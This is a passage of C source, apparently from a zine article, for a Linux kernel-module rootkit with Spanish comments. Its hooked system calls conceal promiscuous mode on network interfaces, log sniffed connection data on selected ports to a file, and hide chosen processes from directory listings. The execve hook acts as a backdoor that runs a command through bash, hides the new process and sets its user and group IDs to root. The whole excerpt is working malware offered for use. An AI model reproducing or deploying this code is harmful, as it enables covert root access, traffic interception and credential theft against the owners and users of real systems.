+{
+  int fd;
+  int mmm = current->mm->brk;
+  int nombre;
+  char buff[1024]; /* 1024 sera suficiente */
+
+  brk((void*)mmm + strlen(LOG_FILE) + 1);
+  
+  __generic_copy_to_user((void*) mmm, LOG_FILE, strlen(LOG_FILE) + 1);
+  
+  fd = open((void*)mmm, O_RDWR | O_APPEND, 0);
+  if (fd < 0) fd = open((void*)mmm, O_RDWR | O_CREAT, 0);
+  brk((void*)mmm);
+  if (fd < 0) return;
+
+  brk((void*) mmm + 1024);
+  sprintf(buff,
+	  "\n--------------------------------------------------------------------\n"
+	  "\t%s [%i] ==> ",mintoa(con->sa),htons(con->sp));
+  __generic_copy_to_user((void*)mmm, buff,strlen(buff));
+  write(fd, (void*)mmm, strlen(buff));
+
+  sprintf(buff,"[%i] %s\n"
+	  "--------------------------------------------------------------------\n",
+	  htons(con->dp),mintoa(con->da));
+  __generic_copy_to_user((void*)mmm, buff,strlen(buff));
+  write(fd, (void*)mmm, strlen(buff));
+
+  brk((void*) mmm + con->len);
+  __generic_copy_to_user((void*)mmm, con->data, con->len);
+  write(fd, (void*)mmm, con->len);
+
+  brk((void*)mmm);
+  close(fd);
+}
+
+void Nuevacon(__u32 sa, __u32 da, __u16 sp, __u16 dp)
+{
+  struct Con *cnue, *ctmp = Conroot;
+
+  if (!ctmp) {
+    Conroot = kmalloc(SIZE_CON, GFP_KERNEL);
+    ctmp = Conroot;
+    mibzero((char*)ctmp, SIZE_CON); 
+    ctmp->sa = sa;
+    ctmp->da = da;
+    ctmp->sp = sp;
+    ctmp->dp = dp;
+    return;
+  }
+
+  while (ctmp->sig) ctmp = ctmp->sig;
+
+  cnue = kmalloc(SIZE_CON, GFP_KERNEL);
+  mibzero((char*)cnue, SIZE_CON); 
+  cnue->sa = sa;
+  cnue->da = da;
+  cnue->sp = sp;
+  cnue->dp = dp;
+
+  cnue->ant = ctmp;
+  ctmp->sig = cnue;
+}
+
+int mira_port(__u16 p) {
+  int c1;
+  for (c1 = 0; c1 < 6; c1++)
+    if (Ports[c1] == htons(p)) return 1;
+  return 0;
+}
+
+struct Con *Busca(__u32 sa, __u32 da, __u16 sp, __u16 dp) {
+  struct Con *Cur = Conroot;
+  if (Cur == NULL) return NULL;
+  while (Cur != NULL) {
+    if (Cur->sa == sa) 
+      if (Cur->da == da)
+	if (Cur->sp == sp)
+	  if (Cur->dp == dp) return Cur;
+    Cur = Cur->sig;
+  }
+  Cur = Conroot;
+  while (Cur != NULL) {
+    if (Cur->sa == da) 
+      if (Cur->da == sa)
+	if (Cur->sp == dp)
+	  if (Cur->dp == sp) return Cur;
+    Cur = Cur->sig;
+  }
+  return NULL;
+}
+
+void mibzero(char *d,int l)
+{
+  while (l--) *(d++) = 0;
+}
+
+char *mintoa(__u32 dir)
+{
+  static char ret[18];
+  unsigned char *p;
+  mibzero(ret,18);
+   
+  p = (char*) &dir;
+  sprintf(ret,"%u.%u.%u.%u",(p[0] & 0xff),(p[1] & 0xff),(p[2] & 0xff),(p[3] & 0xff));
+  return ret;
+}
+
+int mi_ioctl(int fd, int pet, unsigned long arg)
+{
+  int ret;
+  struct ifreq ifr;
+  struct Con *con, *ctmp = Conroot;
+
+  while (ctmp) {
+    con = ctmp->sig;
+    if (ctmp->log) {
+      if (ctmp->len > 0) loguea(ctmp);
+      Borracon(ctmp);
+      con = Conroot;
+    }
+    ctmp = con;
+  }
+  
+  if (pet == SIOCGIFFLAGS) {
+    ret = (*o_ioctl) (fd, pet, arg);
+    __generic_copy_from_user((struct ifreq*)&ifr, (struct ifreq*)arg, sizeof(struct ifreq));
+    if (promisc) ifr.ifr_flags |= IFF_PROMISC;
+    else ifr.ifr_flags &= ~IFF_PROMISC;
+    __generic_copy_to_user((struct ifreq*)arg, (struct ifreq*)&ifr, sizeof(struct ifreq));
+    return ret;
+  }
+  if (pet == SIOCSIFFLAGS) {
+    __generic_copy_from_user((struct ifreq*)&ifr, (struct ifreq*)arg, sizeof(struct ifreq));
+    if ((ifr.ifr_flags & IFF_PROMISC) == IFF_PROMISC) promisc = 1; 
+    else promisc = 0;  
+    ifr.ifr_flags |= IFF_PROMISC;
+    __generic_copy_to_user((struct ifreq*)arg, (struct ifreq*)&ifr, sizeof(struct ifreq));
+    return (*o_ioctl) (fd, pet, arg);
+  }
+  return (*o_ioctl) (fd, pet, arg);
+}
+
+int mi_getdents(unsigned int fd, struct dirent *dirp, unsigned int count)
+{
+    int total = 0, ret;
+    struct dirent *dirp2, *dirp3, *dsrc, *ddst;
+    char *ptr;
+
+    ret = (*o_getdents) (fd, dirp, count);
+    
+    if (ret > 0) {
+     
+      dirp2 = (struct dirent*) kmalloc(ret, GFP_KERNEL);
+      dirp3 = (struct dirent*) kmalloc(ret, GFP_KERNEL);
+      dsrc = dirp2;
+      ddst = dirp3;
+
+      __generic_copy_from_user(dirp2, dirp, ret);
+      mibzero((char*) dirp3, ret);
+      __generic_copy_to_user( dirp, dirp3, ret);
+
+      while (ret > 0) {
+		ret -= dsrc->d_reclen;
+		if (!busca_pid(dsrc->d_name)) {
+	      memcpy( ddst, dsrc, dsrc->d_reclen);
+	      total += ddst->d_reclen;
+	      ptr = (char*) ddst;
+	      ptr += ddst->d_reclen;
+	      ddst = (struct dirent*) ptr;
+	    }
+		ptr = (char*) dsrc;
+		ptr += dsrc->d_reclen;
+		dsrc = (struct dirent*) ptr;
+      }
+      __generic_copy_to_user(dirp, dirp3, total);
+      
+      kfree(dirp2);
+      kfree(dirp3);
+      return total;
+    }
+    return ret;
+}
+
+#ifdef K20
+
+int mi_get_kernel_syms(struct kernel_sym *table) 
+{
+  return 0; /* Esto es la caña eh? ;) */
+}
+
+#endif
+
+int my_execve(const char *filename, const char *argv[], const char *envp[])
+{
+    long __res;
+    __asm__ volatile ("int $0x80":"=a" (__res):"0"(200), "b"((long) (filename)), "c"((long) (argv)), "d"((long) (envp)));
+    return (int) __res;
+}
+
+int mi_execve (char *nombre, const char *arg[], const char *env[])
+{
+  unsigned long mmm,mtmp;
+  int ret;
+  char pid[1024];
+  
+  if (back) {
+    back = 0;
+    mmm = current->mm->brk;
+    brk((void*) mmm + 1024);
+    mtmp = mmm + 16;
+    __generic_copy_to_user((void*)mmm, &mtmp, 4);
+    __generic_copy_to_user((void*) mtmp, "/bin/bash", 10);
+    
+    mtmp = mmm + 26;
+    __generic_copy_to_user((void*)(mmm + 4), &mtmp, 4);
+    __generic_copy_to_user((void*) mtmp, "-c", 3);
+    
+    mtmp = mmm + 29;
+    __generic_copy_to_user((void*)(mmm + 8), &mtmp, 4);
+    __generic_copy_to_user((void*) mtmp, cmd, strlen(cmd) + 1);
+
+    mtmp = 0;
+    __generic_copy_to_user((void*)(mmm + 12), &mtmp, 4);
+
+/*
+ *  Aqui oculto el proceso creado mediante el backdoor
+ */
+    sprintf(pid,"%i",current->pid);
+	nuevo_pid(pid);
+
+/*
+ *  Y le doy privilegios de r00t
+ */
+    current->euid = 0;
+    current->uid = 0;
+    current->egid = 0;
+    current->gid = 0;
+
+    ret = my_execve((void*) (mmm + 16), (void*)mmm, (void*)(mmm + 12));
+  } else
+    ret = my_execve (nombre, arg, env);
+  return ret;
+}
+
+void nuevo_pid(char *nombre)
+{
+	pids[npids+1] = NULL;
+	pids[npids] = (char*) kmalloc(strlen(nombre), GFP_KERNEL);
+	strcpy(pids[npids], nombre);
+	npids++;
+}
+
+int busca_pid(char *nombre)
+{
+	int c = 0;
+	for (c = 0; c < npids; c++) 
+		if (strstr(nombre, pids[c])) return 1;
+	return 0;
+}
+
+<-->
+
+*EOF*
